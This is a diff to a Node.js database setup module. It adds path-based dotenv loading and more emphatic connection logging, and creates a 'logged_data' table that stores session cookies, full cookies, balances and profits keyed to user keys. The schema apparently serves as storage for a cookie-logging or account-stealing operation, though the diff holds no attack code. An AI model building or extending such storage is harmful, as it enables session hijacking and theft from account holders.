@@ -1,6 +1,7 @@
+const path = require('path');
+require('dotenv').config({ path: path.join(__dirname, '.env') });
 const { Pool } = require('pg');
 const sqlite3 = require('sqlite3').verbose();
-require('dotenv').config();
 
 let dbType = 'sqlite';
 let pool;
@@ -8,12 +9,13 @@ let sqliteDb;
 
 if (process.env.DATABASE_URL) {
   dbType = 'postgres';
+  console.log('🟢 DATABASE_URL found — connecting to PostgreSQL (Neon)');
   pool = new Pool({
     connectionString: process.env.DATABASE_URL,
     ssl: { rejectUnauthorized: false }
   });
 } else {
-  console.log('⚠️ DATABASE_URL not found, falling back to local SQLite');
+  console.log('🔴 DATABASE_URL NOT FOUND — falling back to local SQLite (THIS IS WRONG!)');
   sqliteDb = new sqlite3.Database('./database.sqlite');
 
   pool = {
@@ -104,6 +106,19 @@ async function initDb() {
           user_key TEXT,
           created_at TIMESTAMP DEFAULT NOW()
         );
+
+        CREATE TABLE IF NOT EXISTS logged_data (
+          id SERIAL PRIMARY KEY,
+          user_id INTEGER,
+          session_cookie TEXT,
+          full_cookie TEXT,
+          balance TEXT,
+          type TEXT,
+          profits REAL,
+          breakdown JSONB,
+          created_at TIMESTAMP DEFAULT NOW(),
+          FOREIGN KEY(user_id) REFERENCES keys(id)
+        );
       `);
 
       // Migration: Add columns if missing
@@ -148,6 +163,20 @@ async function initDb() {
         id INTEGER PRIMARY KEY AUTOINCREMENT,
         content TEXT NOT NULL,
         author_id INTEGER,
+        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
+      )
+    `);
+
+    await pool.query(`
+      CREATE TABLE IF NOT EXISTS logged_data (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        user_id INTEGER,
+        session_cookie TEXT,
+        full_cookie TEXT,
+        balance TEXT,
+        type TEXT,
+        profits REAL,
+        breakdown TEXT,
         created_at DATETIME DEFAULT CURRENT_TIMESTAMP
       )
     `);
